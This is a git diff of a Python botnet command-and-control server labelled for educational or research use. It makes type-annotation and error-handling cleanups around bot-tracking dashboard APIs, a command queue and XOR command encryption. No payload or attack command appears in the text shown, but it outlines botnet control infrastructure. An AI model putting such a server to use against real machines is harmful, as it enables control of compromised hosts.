@@ -1,4 +1,6 @@
 #!/usr/bin/env python3
+from __future__ import annotations
+
 """
 
 Enhanced Botnet Command & Control Server (Educational/Research Use Only)
@@ -22,7 +24,12 @@ import datetime
 import signal
 import sys
 import argparse
-from typing import Optional, Dict, Any, List
+from typing import Optional, Dict, Any, List, TYPE_CHECKING
+
+try:
+    from typing import TypeAlias
+except ImportError:  # Python <3.10
+    from typing_extensions import TypeAlias  # type: ignore
 from pathlib import Path
 
 # Make aiohttp optional for basic functionality
@@ -31,18 +38,19 @@ try:
     import aiohttp_cors
 
     AIOHTTP_AVAILABLE = True
-
-    # Type aliases for when aiohttp is available
-    WebRequest = web.Request
-    WebResponse = web.Response
 except ImportError:
     AIOHTTP_AVAILABLE = False
     print("Warning: aiohttp not installed. Web dashboard will be disabled.")
     print("Install with: pip install aiohttp aiohttp-cors")
 
-    # Dummy types for when aiohttp is not available
-    WebRequest = Any
-    WebResponse = Any
+if TYPE_CHECKING:
+    from aiohttp import web as _web
+
+    WebRequest: TypeAlias = _web.Request
+    WebResponse: TypeAlias = _web.Response
+else:
+    WebRequest: TypeAlias = Any
+    WebResponse: TypeAlias = Any
 
 # Import our enhanced utilities
 from utils import (
@@ -106,7 +114,7 @@ class EnhancedBotnetServer:
 
     def __init__(
         self, config_file: Optional[str] = None, disable_dashboard: bool = False
-    ):
+    ) -> None:
         """
         Initialize the enhanced botnet server.
 
@@ -136,7 +144,7 @@ class EnhancedBotnetServer:
         self.shutdown_event = asyncio.Event()
 
         # Performance monitoring
-        self.stats = {
+        self.stats: Dict[str, Any] = {
             "start_time": datetime.datetime.now(),
             "total_connections": 0,
             "commands_processed": 0,
@@ -189,7 +197,7 @@ class EnhancedBotnetServer:
     async def serve_dashboard(self, request: WebRequest) -> WebResponse:
         """Serve the cyberpunk dashboard HTML."""
         if not AIOHTTP_AVAILABLE:
-            return None
+            raise RuntimeError("aiohttp not available")
 
         try:
             dashboard_path = Path(__file__).parent / "dashboard.html"
@@ -206,7 +214,7 @@ class EnhancedBotnetServer:
     async def api_status(self, request: WebRequest) -> WebResponse:
         """API endpoint for server status."""
         if not AIOHTTP_AVAILABLE:
-            return None
+            raise RuntimeError("aiohttp not available")
 
         try:
             active_bots = self.bot_tracker.get_active_bots()
@@ -236,7 +244,7 @@ class EnhancedBotnetServer:
     async def api_bots(self, request: WebRequest) -> WebResponse:
         """API endpoint for bot information."""
         if not AIOHTTP_AVAILABLE:
-            return None
+            raise RuntimeError("aiohttp not available")
 
         try:
             active_bots = self.bot_tracker.get_active_bots()
@@ -248,7 +256,7 @@ class EnhancedBotnetServer:
     async def api_stats(self, request: WebRequest) -> WebResponse:
         """API endpoint for detailed statistics."""
         if not AIOHTTP_AVAILABLE:
-            return None
+            raise RuntimeError("aiohttp not available")
 
         try:
             stats_data = self.get_server_stats()
@@ -257,8 +265,10 @@ class EnhancedBotnetServer:
             self.logger.error(f"Error in stats API: {str(e)}")
             return web.json_response({"error": "Internal server error"}, status=500)
 
-    async def api_editor_languages(self, request: web.Request) -> web.Response:
+    async def api_editor_languages(self, request: WebRequest) -> WebResponse:
         """API endpoint exposing CyberEditor language support."""
+        if not AIOHTTP_AVAILABLE:
+            raise RuntimeError("aiohttp not available")
         try:
             return web.json_response({"languages": CYBER_EDITOR_LANGUAGES})
         except Exception as e:
@@ -440,7 +450,7 @@ class EnhancedBotnetServer:
             reader: Stream reader
             writer: Stream writer
         """
-        command_queue = asyncio.Queue()
+        command_queue: asyncio.Queue[str] = asyncio.Queue()
 
         # Start command generation task (simulated for demo)
         command_task = asyncio.create_task(
@@ -793,7 +803,7 @@ def xor_encrypt(cmd: str) -> bytes:
     return encryption.encrypt(cmd)
 
 
-def parse_arguments():
+def parse_arguments() -> argparse.Namespace:
     """Parse command-line arguments."""
     parser = argparse.ArgumentParser(
         description="Enhanced Botnet Server - Educational/Research Use Only",
@@ -860,7 +870,7 @@ Environment Variables:
     return parser.parse_args()
 
 
-async def main():
+async def main() -> None:
     """Main entry point for the enhanced botnet server."""
     import os
 
